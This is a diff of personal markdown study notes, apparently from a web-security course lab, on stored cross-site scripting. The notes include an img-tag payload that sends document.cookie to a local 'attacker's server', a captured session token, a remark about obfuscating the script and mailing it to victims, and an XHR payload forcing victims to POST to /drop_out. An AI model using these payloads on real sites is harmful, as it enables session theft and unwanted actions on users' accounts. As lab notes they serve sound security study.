@@ -416,7 +416,7 @@ Be aware of the tiny implementation details.
 
 Because of the Same orgin policy document.cookie being javascript code. You can only work on the same origin. It cannot come from localhost it should come from northeastern.edu something like that. W will try code injection for that. find a way to check your javascript into the program. 
 
-## Step 1: 
+### Step 1: Find a code injection vector 
 
 Check when you provide some input to the application and get response. when you look at the source your injected code should be reflected in the source. Input that is reflected back if that doesnt exists you can;t inject anything. 
 
@@ -450,6 +450,7 @@ if this does not work use things like
 ```
 
 ```
+### Step 2: Make it a stored XSS 
 
 Now we will try to do stored xss for it, this field is not very promosing. 
 
@@ -467,7 +468,63 @@ Add a script at Display name
 
 ![[Pasted image 20260606185323.png]]
 
-
+### Step 3: Make sure you record the released cookie. 
 
 ![[Pasted image 20260606185732.png]]
 ![[Pasted image 20260606185854.png]]
+
+The `listen.sh` script just runs a simple Python HTTP server on `127.0.0.1:6001`. It's acting as the **attacker's server**.
+
+
+```
+Victim's browser
+      ↓  (XSS payload fires)
+Sends GET request to attacker's server
+      ↓
+GET /x.jpg?login=toby|707c6cdedbf52e52a340d6901136c14
+```
+
+The XSS payload injected into the vulnerable site probably looked something like:
+
+javascript
+
+```javascript
+<img src="http://127.0.0.1:6001/x.jpg?login=" + document.cookie>
+```
+
+So when the victim visits the page, their browser **automatically makes a request** to the attacker's server, with the **stolen cookie/session token appended as a query parameter**.
+
+
+Image tages are not subjected to same origin policy. 
+
+Another way of doing it is copy the script, obfuscate it and send it to someone via mail and mislead them to click it like social engineering way.  
+
+
+![[Pasted image 20260606190925.png]]
+##
+
+To defend against your first attack, the developers change this 
+
+![[Pasted image 20260606191333.png]]
+
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies
+
+`HttpOnly` flag on a cookie means the **browser hides the cookie from client-side JavaScript** (i.e., you cannot access it via `document.cookie` or `XHR/fetch` response headers) cannot be accessed via javascript. 
+
+You want to perform this function 
+
+![[Pasted image 20260606192204.png]]
+The goal is to drop Toby;s account, So that he programatically goes and click on do it. 
+The caveat to remember is he is authorized tool. 
+
+![[Pasted image 20260606192811.png]]
+
+When injected as a stored XSS payload, any user who visits that page will **automatically make a POST request to `/drop_out`** — with their own cookies attached without knowing it.
+
+The browser automatically sends cookies with every request. So if a victim visits the page:
+
+1. Their browser executes the JS
+2. XHR fires a POST to `/drop_out`
+3. The request carries **their session cookies**
+4. Server thinks the victim intentionally hit that endpoint
+
